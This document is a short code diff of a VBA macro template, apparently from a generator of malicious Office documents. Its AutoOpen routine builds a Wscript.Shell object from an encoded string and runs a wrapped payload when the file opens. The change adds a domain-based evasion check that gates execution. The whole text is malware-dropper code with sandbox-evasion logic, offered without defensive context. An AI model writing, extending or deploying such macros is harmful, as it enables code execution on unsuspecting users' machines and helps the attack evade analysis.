@@ -6,12 +6,16 @@ Sub AutoOpen()
 	Dim var2 As Object
 	Dim var3 As Integer
 	Dim var4 As String
+	Dim var5 As String
 	
 	var3 = [int1]
 	var1 = "{[Wscript.Shell]}"
-	Set var2 = CreateObject(decode(var1))
-	var4 = payload_wrapper("data1")
-	var4 = exec(var2, var4, var3)
+	var5 = func_evasion_domain()
+	If (var5 = "bool1") Then 
+		Set var2 = CreateObject(decode(var1))
+		var4 = payload_wrapper("data1")
+		var4 = exec(var2, var4, var3)
+	End If
 End Sub
 
 Function payload_wrapper(payload_wrapper1 As String) As String
